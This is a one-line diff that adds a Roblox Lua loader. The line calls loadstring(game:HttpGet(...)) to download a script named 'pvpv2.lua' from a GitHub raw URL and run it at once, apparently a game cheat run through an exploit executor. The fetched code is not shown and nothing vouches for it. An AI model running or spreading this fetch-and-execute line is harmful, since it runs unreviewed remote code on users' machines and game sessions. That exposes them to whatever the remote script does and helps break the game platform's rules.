@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ozenkenzeus-lang/scriptzeusbavlon/refs/heads/main/pvpv2.lua"))()
